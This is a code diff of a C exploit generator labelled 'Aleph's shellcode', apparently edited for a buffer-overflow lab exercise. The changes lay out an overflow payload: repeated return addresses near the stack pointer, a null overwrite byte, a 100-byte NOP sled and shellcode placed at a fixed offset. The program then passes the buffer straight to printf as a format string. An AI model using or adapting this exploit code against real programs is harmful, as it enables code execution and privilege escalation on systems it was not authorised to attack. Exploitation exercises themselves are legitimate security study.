@@ -1,11 +1,12 @@
 /*
 *  Aleph's shellcode
+* use default 198 since it will overwrite first few with "EGG= "
 */
 
 #include <stdlib.h>
 
 #define DEFAULT_OFFSET                    0
-#define DEFAULT_BUFFER_SIZE             193
+#define DEFAULT_BUFFER_SIZE             500
 #define NOP                            0x90
 
 char shellcode[] =
@@ -31,22 +32,26 @@ void main(int argc, char *argv[]) {
     exit(0);
   }
 
-  addr = get_sp() - offset;
+  addr = get_sp() + 193 - offset;
   // printf("Using address: 0x%x\n", addr);
 
   ptr = buff;
   addr_ptr = (long *) ptr;
-  for (i = 0; i < bsize; i+=4)
+  //fill with addrs
+  for (i = 0; i < 192; i+=4)
     *(addr_ptr++) = addr;
 
-  for (i = 0; i < bsize/2; i++)
+  buff[192] = 0x00; //overwriter
+
+  //make a bunch of nops
+  for (i = 193; i < 293; i++)
     buff[i] = NOP;
 
-  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
   for (i = 0; i < strlen(shellcode); i++)
-    *(ptr++) = shellcode[i];
+    buff[293 + i] = shellcode[i];
 
-  buff[bsize - 1] = 0x5c;
+  //buff[bsize - 1] = '\0';
+  printf(buff);
 
   // memcpy(buff,"EGG=",4);
   // putenv(buff);
